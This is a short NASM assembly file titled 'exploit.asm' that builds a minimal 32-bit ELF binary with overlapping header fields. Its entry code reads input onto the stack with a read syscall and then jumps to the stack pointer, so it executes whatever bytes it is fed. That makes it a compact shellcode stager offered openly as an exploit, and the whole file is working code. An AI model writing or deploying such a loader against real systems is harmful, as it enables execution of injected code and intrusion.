  ; exploit.asm
  ; nasm -f bin -o a.out exploit.asm
  
  BITS 32
  
                org     0x00010000
  
                db      0x7F, "ELF"             ; **e_ident
                dd      1                                       ; **p_type
                dd      0                                       ; **p_offset
                dd      $$                                      ; ~p_vaddr 
                dw      2                       ; **e_type      ; Xp_paddr
                dw      3                       ; **e_machine
                dd      _start                  ; Xe_version    ; ~p_filesz
                dd      _start                  ; **e_entry     ; ~p_memsz
                dd      4                       ; **e_phoff     ; Xp_flags
  _start:
                mov     ecx, esp                ; ?e_shoff      ; Xp_align
                dec     edx
                mov     al, 0x3                 ; Xe_flags
                int     0x80
                jmp     esp

                db      0x00
                ;dw     0x34                    ; Xe_ehsize
                dw      0x20                    ; **e_phentsize
                db      1                       ; Xe_phnum
                                                ; e_shentsize
                                                ; e_shnum
                                                ; e_shstrndx
  
  filesize      equ     $ - $$

